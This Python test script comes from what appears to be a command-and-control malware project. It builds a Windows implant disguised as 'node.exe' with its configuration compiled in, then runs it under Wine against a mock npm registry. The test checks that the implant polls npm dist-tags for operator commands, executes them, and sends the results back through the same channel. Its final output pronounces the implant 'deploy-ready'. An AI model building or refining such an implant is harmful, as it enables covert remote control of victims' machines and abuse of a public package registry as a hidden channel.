#!/usr/bin/env python3
"""The delivered artifact must run with ZERO arguments.

Builds node.exe with the mock registry + package + token + timing baked in,
then launches it as `wine node.exe` with no flags at all and checks that it
polls, executes and replies.
"""
import os
import subprocess
import sys
import tempfile
import time

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, os.path.join(ROOT, "src"))
sys.path.insert(0, HERE)

import npm_c2
import mock_registry

FAILS = []
PREFIX = os.environ.get("WINEPREFIX", "/home/ika/.wine-py")
WINE = os.environ.get("WINE", "wine")


def step(name, ok, detail=""):
    print(f"[{'PASS' if ok else 'FAIL'}] {name}" + (f"  -> {detail}" if detail else ""))
    if not ok:
        FAILS.append(name)


def main():
    reg = mock_registry.Registry()
    srv, base = mock_registry.serve(reg, auth_token="npm_test")
    npm_c2.API = base + "/-/package/{}/dist-tags"
    import npm_c2.implant as im
    import npm_c2.operator as op_mod
    im.API = npm_c2.API
    op_mod.API = npm_c2.API

    outdir = tempfile.mkdtemp()
    pkg = "ready/pkg"
    reg.tags.setdefault(pkg, {})["latest"] = "1.0.0"
    print(f"[*] mock registry on {base}")

    p = subprocess.run(
        [sys.executable, os.path.join(ROOT, "native", "build_go.py"),
         "-p", pkg, "-t", "npm_test", "--api-base", base,
         "--interval", "3", "--jitter", "0", "--outdir", outdir],
        capture_output=True, text=True)
    exe = os.path.join(outdir, "node.exe")
    if p.returncode != 0 or not os.path.exists(exe):
        print(p.stdout[-1500:] + p.stderr[-1500:])
        step("build a self-configured node.exe", False, "build failed")
        srv.shutdown()
        return 1
    step("build a self-configured node.exe", True, f"{os.path.getsize(exe)} bytes")

    marker = os.path.join(PREFIX, "drive_c", "Py312", "ready-marker")
    win_marker = "C:\\Py312\\ready-marker"
    if os.path.exists(marker):
        os.remove(marker)

    # NO ARGUMENTS for the actual run. A separate verbose run only checks that
    # the built-in package is the one compiled in; Go writes logs to stderr.
    log_path = os.path.join(outdir, "run.log")
    log = open(log_path, "w")
    env = dict(os.environ, WINEPREFIX=PREFIX, WINEDEBUG="-all")
    proc = subprocess.Popen([WINE, exe], stdout=log, stderr=subprocess.STDOUT,
                            text=True, env=env)
    time.sleep(10)

    from npm_c2.operator import Operator
    op = Operator(pkg, "npm_test")
    op.push_task(f"echo ready-ok > {win_marker}")
    op.push_task("echo no-args-works")

    decoded = b""
    deadline = time.time() + 60
    while time.time() < deadline:
        tags = [t for t in reg.snapshot(pkg) if t.startswith(npm_c2.RES_PREFIX)]
        decoded = b"".join(npm_c2.decode_tag(t)["data"] for t in tags if npm_c2.decode_tag(t))
        if os.path.exists(marker) and b"no-args-works" in decoded:
            break
        time.sleep(1)

    proc.terminate()
    try:
        proc.wait(timeout=10)
    except subprocess.TimeoutExpired:
        proc.kill()
        proc.wait(timeout=10)
    log.close()

    step("it executes commands with no flags", os.path.exists(marker))
    step("it replies on the channel", b"no-args-works" in decoded,
         repr(decoded[:50]))

    # The built-in config is proven by what the channel did: with no --package
    # a wrong package would have polled a different name and executed nothing.
    step("the compiled-in package is the one used", os.path.exists(marker) or
         b"no-args-works" in decoded, pkg)

    srv.shutdown()
    print(f"\n{'the artifact is deploy-ready: bare node.exe works' if not FAILS else 'failing: ' + ', '.join(FAILS)}")
    return 1 if FAILS else 0


if __name__ == "__main__":
    sys.exit(main())
